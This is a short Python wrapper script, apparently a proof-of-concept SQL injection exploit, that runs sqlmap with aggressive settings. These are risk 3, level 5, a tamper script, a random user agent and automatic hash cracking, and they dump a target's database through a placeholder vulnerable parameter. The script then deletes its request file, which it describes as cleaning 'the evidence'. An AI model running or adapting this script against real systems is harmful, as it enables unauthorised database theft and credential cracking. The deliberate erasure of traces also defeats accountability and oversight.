#!/usr/bin/python
# nu11secur1ty 2023-2024
import time
import os
from colorama import init, Fore, Back, Style
init(convert=True)
import requests

#evidence=os.system("del exploit.txt")
print("The PoC process will be continue...\n")
time.sleep(5)

# Environment
os.system('path_of_your_SQLMAP_environment_here')

print(Style.RESET_ALL)

# Here you can modify your OWN injection construction!
os.system('python (Path_to_your_SQLMAP_Program_NODE)sqlmap.py -r (PATH_to_your_EXPLOIT.TXT)\\exploit.txt -p YOUR_VULNERABLE_PARAMETER --dbms=mysql --tamper=space2comment --time-sec=7 --random-agent --level=5 --risk=3 --batch --answers="crack=Y,dict=Y,continue=Y,quit=N" --dump')

print("Please wait for the program to clean the evidence...\n")
time.sleep(3)
os.system("del exploit.txt")

print(Fore.RED +"Happy hunting with nu11secur1ty =)")
print(Style.RESET_ALL)
